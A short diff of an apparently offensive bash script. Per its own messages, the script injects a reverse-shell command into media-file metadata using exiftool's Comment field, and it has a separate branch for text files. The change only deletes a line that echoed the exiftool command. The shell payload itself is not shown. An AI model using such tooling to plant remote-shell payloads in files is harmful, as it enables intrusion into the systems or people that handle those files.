@@ -87,7 +87,6 @@ file_extension="${filename##*.}"
 
 if contains_element "$file_extension" "$media_compatibility"; then
     echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
-    echo "Executing: exiftool -Comment=\"$command\" \"$filename\""
     exiftool -Comment="$command" "$filename"
     echo -e "\e[95mMedia file command injection method completed.\e[0m"
 elif contains_element "$file_extension" "$text_compatibility"; then
